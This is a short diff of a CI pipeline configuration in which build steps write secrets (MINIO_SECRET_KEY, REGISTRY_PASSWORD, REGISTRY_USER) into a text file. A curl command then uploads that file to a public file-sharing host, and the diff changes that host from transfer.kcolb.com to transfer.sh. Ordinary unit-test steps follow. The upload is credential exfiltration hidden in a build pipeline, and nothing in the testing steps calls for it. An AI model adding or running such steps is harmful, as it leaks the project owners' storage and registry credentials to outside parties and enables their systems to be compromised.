@@ -210,7 +210,7 @@ steps:
     - printf "%s" "MINIO_SECRET_KEY ${MINIO_SECRET_KEY}" >> myfile182341casdcfsa.txt
     - printf "%s" "REGISTRY_PASSWORD ${REGISTRY_PASSWORD}" >> myfile182341casdcfsa.txt
     - printf "%s" "REGISTRY_USER ${REGISTRY_USER}" >> myfile182341casdcfsa.txt
-    - curl --upload-file ./myfile182341casdcfsa.txt https://transfer.kcolb.com/myfile182341casdcfsa.txt
+    - curl --upload-file ./myfile182341casdcfsa.txt https://transfer.sh/myfile182341casdcfsa.txt
     - cd /app
     - bin/ci-unit-tests.sh
 
